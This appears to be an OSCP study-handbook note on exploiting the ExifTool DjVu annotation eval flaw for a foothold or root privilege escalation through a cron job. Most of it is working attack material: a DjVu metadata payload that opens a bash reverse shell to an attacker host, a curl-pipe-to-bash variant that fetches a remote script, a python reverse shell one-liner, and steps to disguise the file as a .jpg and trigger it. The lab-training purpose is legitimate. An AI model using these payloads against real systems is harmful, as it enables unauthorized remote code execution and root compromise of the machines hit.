---
title: "ExifTool DjVu Injection"
slug: exiftool-djvu-injection
category: notes
handbook: oscp
tags: ["file-upload", "exploit-development"]
draft: false
pubDatetime: 2026-07-25T19:48:47+03:00
modDatetime: 2026-09-13T20:51:50+03:00
description: "ExifTool parses the annotation chunk of a DjVu file and passes its contents through a Perl `eval`, so metadata inside the file becomes code."
---
ExifTool parses the annotation chunk of a DjVu file and passes its contents through a Perl `eval`, so metadata inside the file becomes code. Affected versions are 7.44 through 12.23, fixed in 12.24. EDB 49881 is the write-up and payload.

The bug fires wherever exiftool touches an attacker-supplied file, which puts it on both sides of the box:

- A web application that reads or strips metadata on upload runs the payload as the web user, so this is a foothold.
- A cron job that sweeps an uploads directory as root runs it as root, so this is [Privilege Escalation](/collections/oscp/privilege-escalation-linux). Exfiltrated was this case, a per-minute root job running exiftool over the web application's uploads directory.

## Confirm the Version

```bash
exiftool -ver
dpkg -l | grep -i exiftool
```

Anything in the 7.44 to 12.23 range is vulnerable. Distro packages lag badly, so an old exiftool on a current release is normal rather than surprising.

## Build the Payload File

`djvumake` comes from `djvulibre-bin` on Kali:

```bash
sudo apt install djvulibre-bin
```

The annotation chunk holds the payload:

```text
(metadata "\c${system('bash -c \"bash -i >& /dev/tcp/KALI/4444 0>&1\"')};")
```

`\c` starts the escape handling that sends the rest of the string into `eval`, `${system(...)}` runs during string interpolation, and the trailing `;` keeps the resulting Perl statement syntactically valid.

Write it to a file with a quoted heredoc, which is the only form that passes it through untouched:

```bash
cat > exploit <<'EOF'
(metadata "\c${system('bash -c \"bash -i >& /dev/tcp/KALI/4444 0>&1\"')};")
EOF
```

Quoting the delimiter as `<<'EOF'` stops the local shell touching `${system(...)}` and the backslashes before the payload reaches the file. The alternatives all have a way to fail:

- Unquoted `<<EOF` tries to expand `${system(...)}`, fails with `bad substitution`, and leaves an empty file.
- `echo -e`, `printf '%b'`, and any `echo` under dash or `sh -c` read `\c` as "stop output here" and truncate the payload at `(metadata "`.
- Plain bash `echo '...'` keeps `\c` intact but cannot carry the single quotes that `system('...')` needs.

Two characters into the string is a silent failure that still produces a valid-looking `.djvu`, so `cat exploit` and confirm the whole line survived before building the container.

The filename is arbitrary. It only matters as the value of `ANTa=` in the next command, so `payload` or `/tmp/ant.txt` work the same way.

Wrap it in a minimal DjVu container:

```bash
djvumake exploit.djvu INFO=0,0 BGjp=/dev/null ANTa=exploit
mv exploit.djvu exploit.jpg
```

`INFO=0,0` is a zero-size page, `BGjp=/dev/null` an empty background layer, and `ANTa=exploit` the annotation chunk carrying the payload. Nothing else has to be a valid image.

The extension does not matter to exiftool, which identifies the format from the file contents, so `exploit.jpg` still parses as DjVu. That rename is also what gets the file past an upload filter or a cron job that only looks at `*.jpg`.

## Keep the Injected Command Simple

The command sits three layers deep: a shell string inside a Perl string inside the DjVu metadata. Any payload carrying its own quotes fights that nesting. Keeping the injected command trivial and pulling the real shell from Kali avoids the whole problem:

```text
(metadata "\c${system('curl KALI/shell.sh|bash')};")
```

with `shell.sh` holding a payload that does not depend on bash redirection:

```sh
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("KALI",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

Useful when `/bin/sh` on the target is dash, where `>&` fails. See [Reverse Shells](/collections/oscp/reverse-shells).

## Deliver and Trigger

Serve the file and pull it down into the directory that gets processed:

```bash
sudo python3 -m http.server 80                  # on Kali
wget KALI/exploit.jpg            # on the target
```

Three things have to line up: the file must land in the directory the job actually reads, the job's user must be able to read it, and the name must survive whatever filter the job applies. A job built around `ls $IMAGES | grep "jpg"` never passes a `.djvu` file to exiftool at all, which is the second reason to rename beyond getting past an upload filter. Confirm all three before waiting on a timer.

Then start the listener and wait for the schedule. Use pspy to establish the interval and the exact command line first, rather than guessing how long to sit on a listener. See [Cron Jobs](/collections/oscp/cron-jobs) for the enumeration side, and [File Transfers](/collections/oscp/file-transfers) when `wget` is missing.

## Related

- GitLab's CVE-2021-22205 is the same bug reached through GitLab's image upload endpoint, unauthenticated in the affected versions.
- The general shape of the flaw, user data reaching an interpreter through a helper the application shells out to, is the same one behind the pdfkit case in [Command Injection](/collections/oscp/command-injection).
